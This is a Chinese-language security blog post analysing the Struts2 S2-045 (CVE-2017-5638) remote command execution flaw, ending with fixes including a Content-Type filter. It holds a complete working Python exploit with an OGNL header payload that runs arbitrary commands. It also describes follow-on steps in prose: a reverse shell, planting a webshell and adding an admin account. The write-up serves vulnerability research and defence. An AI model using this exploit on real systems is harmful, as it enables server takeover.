---
title: Struts2远程命令执行漏洞
categories:
  - 命令执行
tags:
  - Struts2
  - 命令执行漏洞
toc: true 文章目录
author: BlBana
date: 2017-03-08 19:00:13
description:
comments:
original:
permalink:
---
## S2-045 Struts2远程命令执行漏洞

### 0x01 stucts
Struts是Apache基金会的一个开源项目，Struts通过采用Java Servlet/JSP技术，实现了基于Java EE Web应用的Model-View-Controller(MVC)设计模式的应用框架，是MVC经典设计模式中的一个经典产品。
<!-- more -->
### 0x02 影响范围
Struts 2.3.5 – Struts 2.3.31 Struts 2.5 – Struts 2.5.10

### 0x03 不受影响版本
Struts 2.3.32 Struts 2.5.10.1

### 0x04 漏洞危害
在default.properties文件中，struts.multipart.parser的值有两个选择，分别是jakarta和pell。在Strucs 2框架中jakarta解析器是框架的标准组成部分。默认这个解析器是启动的。
由于该组件解析上传文件的Content-Type头时，异常处理函数没有正确的处理用户输入的错误信息。导致可以远程发送恶意的上传数据包，利用漏洞可以执行任意的命令。
> 漏洞编号：CVE-2017-5638
> 漏洞名称：S2-045：Struts 2远程执行代码漏洞
> 漏洞影响：基于JakartaMultipart解析器执行文件上传时可能的RCE

### 0x05 PoC漏洞检测
```python
#! /usr/bin/env python
# encoding:utf-8
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
def poc():
    if len(sys.argv) < 3:
        print '''Usage: poc.py http://172.16.12.2/example/HelloWorld.action "command"'''
        sys.exit()
    register_openers()
    datagen, header = multipart_encode({"image": open("tmp.txt", "w+")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+str(sys.argv[2])+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)
    response = urllib2.urlopen(request)
    print response.read()
poc()
```
**通过此PoC确认目标是否存在此漏洞**，此外还可以通过Seebug上的照妖镜来进行在线的检测，可以判断目标机器是否存在漏洞。

### 0x06 漏洞复现
我在本机的ubuntu上复现了此漏洞，配置环境如下：
1. Tomcat5
2. struts 2.3.31

1. 部署的方式比较容易，先安装好Tomcat的服务器，访问http://localhost:8080进行检测环境是否搭建成功。（需在服务器上配置好Java环境，参考连接：[Tomcat环境部署](http://drops.blbana.cc/2016/10/24/e9-80-9a-e8-bf-87tomcat-e8-8e-b7-e5-8f-96webshell/%22Tomcat%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%22)）
![enter image description here](http://blog.blbana.cc/img/hexo/Struts/1.png)

2. Tomcat的环境搭建完成了以后，可以进入struts2的官网下载存在漏洞的应用程序版本，利用刚才部署环境里的方法将struts2的war包导入到Tomcat的环境当中，访问搭建好的环境如下所示：
![enter image description here](http://blog.blbana.cc/img/hexo/Struts/2.png)

3. 环境搭建完成以后，可以利用上面的PoC对其进行一个测试的操作
> 注意：这个脚本需要安装poster的python类库才能正常运行
我是在windows环境下进行测试的，直接运行python的脚本，填写好目标的地址，可以拿到一个执行命令的权限
![enter image description here](http://blog.blbana.cc/img/hexo/Struts/3.png)

4. 接下来我们可以在公网的服务器上监听一个端口，然后利用命令执行反弹一个shell给服务器，直接获取服务器的权限
![enter image description here](http://blog.blbana.cc/img/hexo/Struts/4.png)

![enter image description here](http://blog.blbana.cc/img/hexo/Struts/5.png)

5. 除此之外，当我们拿到了较高的权限的时候，还可以在我们的服务器上放一个webshell，然后通过执行命令将服务器上的webshell下载到目标机器上，这里注意的是需要**知道网站的真实路径**（*通过locate *.jsp来定位jsp文件的位置*），之后当获得了webshell的时候就可以得到文件管理，上传等权限了。

6. 对于windows服务器可以直接执行创建用户和添加管理员的两条命令，如果3389端口打开，可以直接利用创建的用户打开远程桌面。

### 0x07漏洞修复
1. 升级版本：正在使用Jakarta文件上传插件的可以升级版本到struts2的安全版本
2. 过滤验证：通过判断Content-Type是否为白名单，限制非法的攻击
加固代码：

```java
import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
 
 
public class SecurityFilter extends HttpServlet implements Filter {
 
        /**
         * 
         */
        private static final long serialVersionUID = 1L;
         
         
        public final String www_url_encode= "application/x-www-form-urlencoded";
        public final String mul_data= "multipart/form-data ";
        public final String txt_pla= "text/plain";
 
        public void doFilter(ServletRequest arg0, ServletResponse arg1,
                        FilterChain arg2) throws IOException, ServletException {
 
                HttpServletRequest request = (HttpServletRequest) arg0;
                HttpServletResponse response = (HttpServletResponse) arg1;
                 
                String contenType=request.getHeader("conTent-type");
                 
                if(contenType!=null&&!contenType.equals("")&&!contenType.equalsIgnoreCase(www_url_encode)&&!contenType.equalsIgnoreCase(mul_data)&&!contenType.equalsIgnoreCase(txt_pla)){
                         
                        response.setContentType("text/html;charset=UTF-8");
                        response.getWriter().write("非法请求Content-Type！");
                        return;
                }
                arg2.doFilter(request, response);
        }
 
        public void init(FilterConfig arg0) throws ServletException {
 
        }
 
}
```
编译成“SecurityFilter.class”复制到应用的WEB-INF/classes目录下，配置web.xml文件，使该文件生效

3. 还有一种方法就是进入将默认的Jakarta模块改为使用Pell模块


---
